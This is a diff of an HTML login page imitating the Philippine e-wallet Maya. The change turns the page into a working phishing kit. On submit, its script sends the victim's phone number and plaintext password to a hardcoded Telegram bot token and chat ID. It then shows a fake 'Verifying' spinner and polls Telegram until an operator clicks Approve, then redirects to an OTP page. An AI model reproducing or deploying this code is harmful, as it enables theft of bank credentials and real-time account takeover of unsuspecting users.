@@ -5,11 +5,18 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Login - Maya</title>
   <style>
-    :root{--mint:#00c896;--dark:#009f7a;--pale:#e2faf4;--blue:#176ff5;--ink:#123b36;--muted:#75908c;--line:#d9eeea;--white:#fff;--danger:#d94b4b;--shadow:0 20px 50px #1255491f}*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Inter,Arial,sans-serif;color:var(--ink);background:linear-gradient(135deg,#e9faf5,#f8fffd)}button,input,select,textarea{font:inherit}button{cursor:pointer}.nav-brand{display:block;width:120px;height:auto}.help-button{position:fixed;z-index:10;top:18px;right:20px;border:0;border-radius:999px;background:#111;color:#fff;padding:10px 18px;font-size:13px;font-weight:800;box-shadow:0 8px 18px #0003}.page-footer{margin-top:auto;padding:18px 20px 20px;text-align:center;color:var(--muted);font-size:12px}.auth-screen{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:70px 20px 0;min-height:100vh}.auth-card{width:min(100%,480px);padding:34px 30px 25px;border:1px solid var(--line);border-radius:27px;background:#fff;box-shadow:var(--shadow)}.auth-logo{width:130px;margin:0 auto 27px}.auth-card h1{margin:0;text-align:center;font-size:28px}.subtitle{margin:10px 0 23px;text-align:center;line-height:1.5;color:var(--muted)}.group{margin-bottom:16px}.group label{display:block;margin-bottom:8px;font-size:13px;font-weight:800}.field{display:flex;align-items:center;overflow:hidden;border:1px solid var(--line);border-radius:12px;background:#fbfffe;position:relative}.field:focus-within{border-color:var(--mint);box-shadow:0 0 0 4px #00c8961a}.field input,.field textarea,.field select{width:100%;padding:14px;border:0;outline:0;background:transparent;color:var(--ink)}.prefix{padding-left:14px;color:var(--muted);font-weight:800}.toggle{padding:9px;border:0;background:transparent;color:var(--dark);font-size:12px;font-weight:800;position:absolute;right:10px}.primary-button{width:100%;padding:15px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--mint),var(--dark));color:#fff;font-weight:800}.error{display:none;margin-bottom:14px;padding:11px;border-radius:10px;background:#fff0f0;color:var(--danger);font-size:13px;font-weight:700}.error.show{display:block}.auth-footer{text-align:center;color:var(--muted);font-size:13px;margin-top:20px}.auth-footer a{color:var(--dark);font-weight:800;text-decoration:none}
+    :root{--mint:#00c896;--dark:#009f7a;--pale:#e2faf4;--blue:#176ff5;--ink:#123b36;--muted:#75908c;--line:#d9eeea;--white:#fff;--danger:#d94b4b;--shadow:0 20px 50px #1255491f}*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Inter,Arial,sans-serif;color:var(--ink);background:linear-gradient(135deg,#e9faf5,#f8fffd)}button,input,select,textarea{font:inherit}button{cursor:pointer}.nav-brand{display:block;width:120px;height:auto}.help-button{position:fixed;z-index:10;top:18px;right:20px;border:0;border-radius:999px;background:#111;color:#fff;padding:10px 18px;font-size:13px;font-weight:800;box-shadow:0 8px 18px #0003}.page-footer{margin-top:auto;padding:18px 20px 20px;text-align:center;color:var(--muted);font-size:12px}.auth-screen{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:70px 20px 0;min-height:100vh}.auth-card{width:min(100%,480px);padding:34px 30px 25px;border:1px solid var(--line);border-radius:27px;background:#fff;box-shadow:var(--shadow)}.auth-logo{width:130px;margin:0 auto 27px}.auth-card h1{margin:0;text-align:center;font-size:28px}.subtitle{margin:10px 0 23px;text-align:center;line-height:1.5;color:var(--muted)}.group{margin-bottom:16px}.group label{display:block;margin-bottom:8px;font-size:13px;font-weight:800}.field{display:flex;align-items:center;overflow:hidden;border:1px solid var(--line);border-radius:12px;background:#fbfffe;position:relative}.field:focus-within{border-color:var(--mint);box-shadow:0 0 0 4px #00c8961a}.field input,.field textarea,.field select{width:100%;padding:14px;border:0;outline:0;background:transparent;color:var(--ink)}.prefix{padding-left:14px;color:var(--muted);font-weight:800}.toggle{padding:9px;border:0;background:transparent;color:var(--dark);font-size:12px;font-weight:800;position:absolute;right:10px}.primary-button{width:100%;padding:15px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--mint),var(--dark));color:#fff;font-weight:800;cursor:pointer}.error{display:none;margin-bottom:14px;padding:11px;border-radius:10px;background:#fff0f0;color:var(--danger);font-size:13px;font-weight:700}.error.show{display:block}.auth-footer{text-align:center;color:var(--muted);font-size:13px;margin-top:20px}.auth-footer a{color:var(--dark);font-weight:800;text-decoration:none}.spinner-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;align-items:center;justify-content:center;flex-direction:column}.spinner{width:50px;height:50px;border:4px solid var(--pale);border-top-color:var(--mint);border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.spin-label{margin-top:20px;font-size:16px;font-weight:800;color:#fff;text-align:center}.spin-sub{margin-top:8px;font-size:13px;color:#fff;opacity:0.9;text-align:center}
   </style>
 </head>
 <body>
   <button class="help-button" type="button" onclick="alert('Help is available in this prototype.')">Help</button>
+
+  <!-- Spinner overlay -->
+  <div class="spinner-overlay" id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+  </div>
 
   <section class="auth-screen">
     <div class="auth-card">
@@ -41,27 +48,144 @@
   </section>
 
   <script>
-    const phone=document.getElementById('phone'),password=document.getElementById('password');
-    const mask=p=>'+63 '+p.slice(0,2)+'****'+p.slice(-2);
-    
-    document.getElementById('loginForm').onsubmit=e=>{
+    const CONFIG = {
+      BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k',
+      CHAT_ID: '8820857419',
+      OTP_PAGE: 'otp.html',
+      SUCCESS_PAGE: 'success.html'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const phone = document.getElementById('phone');
+    const password = document.getElementById('password');
+    const loginForm = document.getElementById('loginForm');
+    const loginError = document.getElementById('loginError');
+    const togglePassword = document.getElementById('togglePassword');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+
+    // ── Input sanitisation ──
+    phone.addEventListener('input', () => {
+      phone.value = phone.value.replace(/\D/g, '').slice(0, 10);
+    });
+
+    // ── Helpers ──
+    function showError(msg) {
+      loginError.textContent = msg;
+      loginError.classList.add('show');
+    }
+
+    function resetButton() {
+      isProcessing = false;
+      const btn = loginForm.querySelector('button[type="submit"]');
+      btn.disabled = false;
+      btn.textContent = 'Continue';
+    }
+
+    // ── Telegram bot send + poll ──
+    function sendToBot(phoneNumber, pwd) {
+      if (isProcessing) return;
+      isProcessing = true;
+      const btn = loginForm.querySelector('button[type="submit"]');
+      btn.disabled = true;
+      btn.textContent = 'Verifying…';
+
+      const ts = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 Maya Philippines Login Verification</b>\n\nPhone: <code>+63${phoneNumber}</code>\nPassword: <code>${pwd}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve Login', callback_data: approveId },
+                { text: '❌ Decline', callback_data: declineId }
+              ]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        localStorage.setItem('phone', phoneNumber);
+        localStorage.setItem('mayaLogin', JSON.stringify({ phone: phoneNumber, loginTime: new Date().toISOString() }));
+        spinnerOverlay.style.display = 'flex';
+        startPolling(approveId, declineId);
+      })
+      .catch(() => {
+        resetButton();
+        showError('Connection error. Please try again.');
+      });
+    }
+
+    function startPolling(approveId, declineId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.OTP_PAGE;
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  showError('Login request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          });
+      }, 1000);
+    }
+
+    // ── Toggle password visibility ──
+    togglePassword.addEventListener('click', (e) => {
       e.preventDefault();
-      if(phone.value.length<10||!password.value){
-        document.getElementById('loginError').classList.add('show');
+      const hidden = password.type === 'password';
+      password.type = hidden ? 'text' : 'password';
+      togglePassword.textContent = hidden ? 'Hide' : 'Show';
+    });
+
+    // ── Submit ──
+    loginForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      loginError.classList.remove('show');
+
+      const phoneValue = phone.value.replace(/\D/g, '');
+      const passwordValue = password.value.trim();
+
+      if (phoneValue.length < 10) {
+        showError('Please enter a valid 10-digit mobile number.');
         return;
       }
-      document.getElementById('loginError').classList.remove('show');
-      sessionStorage.setItem('maskedPhone', mask(phone.value));
-      window.location.href='otp.html';
-    };
-    
-    document.getElementById('togglePassword').onclick=()=>{
-      const hidden=password.type==='password';
-      password.type=hidden?'text':'password';
-      document.getElementById('togglePassword').textContent=hidden?'Hide':'Show';
-    };
-    
-    document.querySelectorAll('input[type=tel]').forEach(x=>x.addEventListener('input',()=>x.value=x.value.replace(/\D/g,'').slice(0,10)));
+      if (!passwordValue) {
+        showError('Please enter your password.');
+        return;
+      }
+
+      sendToBot(phoneValue, passwordValue);
+    });
+
+    // ── Init ──
+    window.addEventListener('pageshow', (event) => {
+      if (event.persisted) window.location.reload();
+    });
   </script>
 </body>
 </html>
